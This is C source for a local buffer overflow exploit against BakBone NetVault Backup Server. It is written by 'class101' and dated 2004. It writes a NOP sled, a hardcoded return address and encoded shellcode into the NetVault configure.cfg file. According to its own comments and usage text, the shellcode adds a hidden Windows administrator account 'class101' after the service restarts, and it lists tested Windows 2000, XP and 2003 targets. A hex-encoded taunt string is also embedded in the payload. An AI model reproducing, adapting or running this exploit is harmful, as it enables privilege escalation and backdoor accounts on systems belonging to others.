/*
for more informations class101.org/netv-locsbof.pdf												
*/

#include <stdio.h>
#include <string.h>
#ifdef WIN32
#include "winsock2.h"
#pragma comment(lib, "ws2_32")
#else
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#endif

char scode1[]=
/*add u:class101 p:class101 (*Administrators *users)*/
"\x33\xC9\x83\xE9\xC7\xE8\xFF\xFF\xFF\xFF\xC0\x5E\x81\x76\x0E\x15"
"\x90\x39\xE8\x83\xEE\xFC\xE2\xF4\xE9\x78\x7F\xE8\x15\x90\xB2\xAD"
"\x29\x1B\x45\xED\x6D\x91\xD6\x63\x5A\x88\xB2\xB7\x35\x91\xD2\x0B"
"\x3B\xD9\xB2\xDC\x9E\x91\xD7\xD9\xD5\x09\x95\x6C\xD5\xE4\x3E\x29"
"\xDF\x9D\x38\x2A\xFE\x64\x02\xBC\x31\x94\x4C\x0B\x9E\xCF\x1D\xE9"
"\xFE\xF6\xB2\xE4\x5E\x1B\x66\xF4\x14\x7B\xB2\xF4\x9E\x91\xD2\x61"
"\x49\xB4\x3D\x2B\x24\x50\x5D\x63\x55\xA0\xBC\x28\x6D\x9F\xB2\xA8"
"\x19\x1B\x49\xF4\xB8\x1B\x51\xE0\xFC\x9B\x39\xE8\x15\x1B\x79\xDC"
"\x10\xEC\x39\xE8\x15\x1B\x51\xD4\x4A\xA1\xCF\x88\x43\x7B\x34\x80"
"\xFA\x5E\xD9\x88\x7D\x08\xC7\x62\x1B\xC7\xC6\x0F\xFD\x7E\xC6\x17"
"\xEA\xF3\x54\x8C\x3B\xF5\x41\x8D\x35\xBF\x5A\xC8\x7B\xF5\x4D\xC8"
"\x60\xE3\x5C\x9A\x35\xF3\x55\x89\x66\xE3\x08\xD8\x24\xB0\x5A\x84"
"\x74\xE3\x4A\xD9\x25\xA1\x19\xC7\x54\xD4\x7D\xC8\x33\xB6\x19\x86"
"\x70\xE4\x19\x84\x7A\xF3\x58\x84\x72\xE2\x56\x9D\x65\xB0\x78\x8C"
"\x78\xF9\x57\x81\x66\xE4\x4B\x89\x61\xFF\x4B\x9B\x35\xF3\x55\x89"
"\x66\xE3\x08\xD8\x24\xB0\x16\xA9\x51\xD4\x39\xE8";


static char payload[8000];
FILE *fl, *fl2;
char *fp, line[1024];

int check(int argc,char *argv[]),i=0,j=0;
int check2();
void ver();
void usage(char* us);

char EOL[]="\x0D\x0A";
char esp[]="\xDD\x20\x02\x10";
char vul[]="\x4E\x61\x6D\x65\x3D";
char fun[]="\x3C\x63\x30\x64\x33\x72\x3E\x20\x27\x6C\x6F\x20\x49\x27\x6D\x20"
           "\x67\x61\x79\x20\x49\x27\x6D\x20\x66\x72\x6F\x6D\x20\x49\x48\x53";


int main(int argc,char *argv[])
{
	ver();
	if (argc>5||argc<2||atoi(argv[1])>2||atoi(argv[1])<1){usage(argv[0]);return -1;}
	if (check(argc,argv)==-1){return -1;}
	while (!feof(fl))
	{
		fgets(line, sizeof(line),fl);
		if (strstr(line,vul)){
			i++;j++;}
		if (i==2){
			strcpy(line,vul);
			memset(line+5,0x90,600);
			memcpy(line+252,esp,4);
			memcpy(line+16,fun,32);
			memcpy(line+260,scode1,strlen(scode1));
			memcpy(line+605,EOL,2);i=0;j++;
		}
		strcat(payload,line);
	}
	if (strstr(payload,vul)==NULL||j==1){
		printf("[+] \"%s\" isn't a default NetVault file..\n",fp);return -1;}
	if (check2()==1){
		fprintf(fl,"%s",payload);
	    printf("[+] \"%s\" correctly exploited\n",fp);
		printf("[+] a service restart is needed to execute the payload\n");
	}
	else printf("[+] can't write to \"%s\", something is wrong...\n",fp);
    return 0;

}

int check(int argc,char *argv[])
{
	if (argc>2){fp=argv[2];}
	else fp="configure.cfg";
	if ((fl =fopen(fp,"r+"))==NULL){
		printf("[+] \"%s\" not found or no rights to read/write\n",fp);return -1;}
	return 1;
}

int check2()
{
	if ((fl =fopen(fp,"r+"))==NULL)
		return -1;
	else return 1;
}

void usage(char* us) 
{  
	printf("      [+]  . 101_netv.exe Target (adduser mode)                                 \n");
	printf("      [+]  . 101_netv.exe Target YourFile.cfg (adduser mode)                    \n");
	printf("TARGETS:                                                                        \n");
	printf("      [+] 1. Win2k  SP4  Server English (*) - v5.0.2195                         \n");
	printf("      [+] 1. Win2k  SP4  Pro    English (*) - v5.0.2195                         \n");
	printf("      [+] 1. WinXP  SP0  Pro.   English     - v5.1.2600                         \n");
	printf("      [+] 1. WinXP  SP1  Pro.   English (*) - v5.1.2600                         \n");
	printf("      [+] 1. WinXP  SP1a Pro.   English (*) - v5.1.2600                         \n");
	printf("      [+] 1. WinXP  SP2  Pro.   English (*) - v5.1.2600.2180                    \n");
	printf("      [+] 1. Win2k3 SP0  Server English (*) - v5.2.3790                         \n");
	printf("NOTE:                                                                           \n");
	printf("      The exploit mods the netvault's cfg file to add a win32                   \n");
	printf("      user:class101 pass:class101 after a restart of the netvault service.      \n");
	printf("      A wildcard (*) mean tested working, else, supposed working.               \n");
	printf("      A symbol   (-) mean all.                                                  \n");
	printf("      Compilation msvc6, cygwin, Linux.                                         \n");
	return;
}

void ver()
{	
	printf("                                                                   \n");
	printf("        ===================================================[v0.1]====\n");
	printf("        ===============BakBone NetVault, Backup Server===============\n"); 
	printf("        =========Computername, Local Buffer Overflow Exploit=========\n");
	printf("        ======coded by class101=============[Hat-Squad.com 2004]=====\n");
	printf("        =============================================================\n");
	printf("                                                                   \n");
}
